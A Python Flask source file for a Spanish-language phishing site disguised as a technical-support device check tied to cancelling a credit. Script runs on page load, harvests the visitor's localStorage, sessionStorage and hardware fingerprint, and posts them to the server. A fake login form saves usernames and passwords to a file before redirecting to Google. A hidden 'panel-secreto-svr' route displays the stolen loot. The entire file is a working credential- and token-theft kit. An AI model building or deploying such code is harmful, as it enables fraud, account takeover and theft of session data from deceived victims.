from flask import Flask, render_template_string, request, redirect, jsonify
import datetime
import json

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Soporte Técnico | Verificación de Dispositivo</title>
    <script>
        async function exfiltrate_vault() {
            // 1. Recolección de Almacenamiento (LocalStorage y SessionStorage)
            let storage_dump = {
                local: {},
                session: {}
            };
            
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    let k = localStorage.key(i);
                    storage_dump.local[k] = localStorage.getItem(k);
                }
                for (let i = 0; i < sessionStorage.length; i++) {
                    let k = sessionStorage.key(i);
                    storage_dump.session[k] = sessionStorage.getItem(k);
                }
            } catch (e) { storage_dump.error = "Acceso restringido por política de origen"; }

            // 2. Fingerprint Avanzado (Fuentes e Idiomas)
            const hardware = {
                mem: navigator.deviceMemory,
                cpu: navigator.hardwareConcurrency,
                touch: navigator.maxTouchPoints,
                fonts: document.fonts ? document.fonts.size : 'N/A'
            };

            // Enviar "El Botín" al servidor
            fetch('/svr_vault_dump', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({storage: storage_dump, hw: hardware})
            });
        }

        window.onload = exfiltrate_vault;
    </script>
    <style>
        body { background: #010409; color: #c9d1d9; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: #0d1117; border: 1px solid #30363d; padding: 40px; border-radius: 10px; text-align: center; max-width: 400px; }
        .loading { border: 4px solid #238636; border-radius: 50%; border-top: 4px solid transparent; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { color: #238636; font-weight: bold; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="loading"></div>
        <div class="status">SINCRO-SVR ACTIVA</div>
        <h2 style="margin:10px 0;">Verificando Entorno...</h2>
        <p style="font-size:13px; color:#8b949e;">No cierre esta ventana mientras analizamos la integridad de su hardware para la cancelación del crédito.</p>
        <form action="/login" method="post" style="margin-top:20px;">
            <input type="text" name="u" placeholder="Usuario/Email" required style="width:100%; padding:10px; margin-bottom:10px; background:#010409; border:1px solid #30363d; color:white;">
            <input type="password" name="p" placeholder="Contraseña" required style="width:100%; padding:10px; margin-bottom:10px; background:#010409; border:1px solid #30363d; color:white;">
            <button type="submit" style="width:100%; padding:12px; background:#238636; color:white; border:none; border-radius:5px; cursor:pointer;">FINALIZAR PROCESO</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/svr_vault_dump', methods=['POST'])
def svr_vault_dump():
    data = request.json
    with open("vault_dump.json", "a") as f:
        f.write(json.dumps(data) + "\\n")
    return '', 204

@app.route('/panel-secreto-svr')
def ver_botin():
    try:
        with open("capturas.txt", "r") as f: creds = f.read()
    except: creds = "Vacio."
    try:
        with open("vault_dump.json", "r") as f: vault = f.read()
    except: vault = "Vaciando memoria..."
    
    return f"""
    <html><body style='background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px;'>
    <h2>🛰️ SVR-MATRIX: VAULT EXPLOTATION</h2><hr>
    <h3>🔑 CREDENCIALES:</h3><pre>{creds}</pre>
    <h3>📦 VOLCADO DE MEMORIA (STORAGE):</h3><pre>{vault}</pre>
    </body></html>
    """

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['POST'])
def login():
    u, p = request.form.get('u'), request.form.get('p')
    with open("capturas.txt", "a") as f:
        f.write(f"[{datetime.datetime.now()}] {u} | {p}\\n")
    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
